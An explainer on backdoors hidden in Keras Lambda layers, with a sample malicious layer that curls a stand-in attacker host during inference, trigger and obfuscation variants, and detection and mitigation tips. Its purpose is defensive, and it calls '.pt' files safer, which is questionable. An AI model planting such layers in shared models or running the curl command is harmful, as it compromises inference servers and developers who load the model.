# Lambda Layer Backdoors

Lambda layers in Keras (and similar constructs in other frameworks) allow developers to inject **arbitrary Python functions** directly into a model’s computational graph. While convenient, they represent a **high-risk attack surface**.

## What Is a Lambda Layer?

A Lambda layer lets you define custom logic inline, without writing a full class.

```python
from tensorflow.keras.layers import Lambda
import tensorflow as tf

layer = Lambda(lambda x: tf.math.log(x + 1e-6))
```

✅ Simple and expressive\
🚨 Also dangerous: the function passed can contain **ANY executable Python logic**

## Malicious Lambda Layer Example

```python
import os
from tensorflow.keras.layers import Lambda

malicious = Lambda(lambda x: (os.system("curl attacker.com/pwned"), x)[1])
```

This layer will run `curl attacker.com/pwned` **once per inference** — even if the model appears otherwise safe.

## Why Lambda Layers Are Risky

* Hidden in serialized models (`.h5`, `.keras`)
* No warning when loading or using the model
* Easily obfuscated (base64, dynamic import, lambda chains)
* Often ignored during model auditing

## Exploitable Scenarios

| Scenario                              | Description                                       |
| ------------------------------------- | ------------------------------------------------- |
| User uploads a `.h5` file to finetune | Triggers Lambda layer execution on load           |
| Inference server loads shared model   | Executes payload during prediction                |
| LoRA adapter contains `Lambda()`      | Payload hidden in adapter-to-base binding process |
| Open model checkpoint on HF or GitHub | Lambda backdoor executed by unsuspecting dev      |

## Trigger Variants

* Silent background command
* Only activate on specific input shape or content
* Trigger on numeric thresholds
* Trigger once per boot

## Loading a Model with Lambda Layer

```python
from tensorflow.keras.models import load_model

model = load_model("backdoored_model.h5", compile=False)  # Will execute code!
```

Even if compile is off — the Lambda layer will run.

## Detection Techniques

| Technique              | Description                                 |
| ---------------------- | ------------------------------------------- |
| Static Inspection      | Search for `Lambda(` in model architecture  |
| Disassemble `.h5`      | Use `h5py` or `netron` to inspect internals |
| Regex Scan             | Look for `os.system`, `subprocess`, `eval`  |
| Trace During Inference | Monitor system calls, logs, or callbacks    |

## Safer Alternatives

* Use fully defined custom layers with `@tf.function`
* Prefer `safetensors`, `.pt`, or TF `.pb` formats
* Avoid uploading unverified models to cloud endpoints

## Summary

Lambda layers are an RCE time bomb embedded in deep learning.\
Just one line — in just one layer — can compromise an entire inference pipeline.
